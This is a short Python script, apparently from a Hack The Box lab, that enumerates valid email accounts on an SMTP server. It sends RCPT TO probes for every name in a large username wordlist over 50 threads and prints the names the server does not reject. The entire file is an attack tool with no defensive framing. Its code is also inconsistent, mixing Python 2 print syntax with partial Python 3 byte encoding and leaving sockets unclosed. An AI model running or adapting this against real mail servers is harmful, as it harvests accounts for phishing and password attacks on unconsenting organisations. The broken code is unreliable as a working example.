import sys
import socket
import threading

ip = '10.13.38.12'
domain = 'EXCHANGE.HTB.LOCAL'
mail_from = 'morph3@ecorp.com'
n_threads = 50
m_list = []
t_list = []

if (len(sys.argv) < 2):
    print("python smtp_user_enum.py /opt/SecLists/Usernames/xato-net-10-million-usernames.txt")
    sys.exit(1)
fn = sys.argv[1]
f = open(fn,"r")
[m_list.append(m.replace("\n","")) for m in f]
m_list.reverse()

def send_mail():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, 25))
            r = s.recv(1024)
            s.send(("HELO {}\r\n".format(domain)).encode())
            r = s.recv(1024)
            s.send(("MAIL FROM: {}\r\n".format(mail_from)).encode())
            r = s.recv(1024)
            x = m_list.pop()
            s.send("RCPT TO: {}@humongousretail.com\r\n".format(x))
            r = s.recv(1024)
            r = r.decode()
            if "550" not in r:
                print x
        except IndexError:
            sys.exit(1)
    return 

for t in range(n_threads):
    t = threading.Thread(target=send_mail,)
    t_list.append(t)
    t.daemon = True
    t.start()
        
for t in t_list:
    try:  
        t.join()
    except KeyboardInterrupt:
        sys.exit(1)
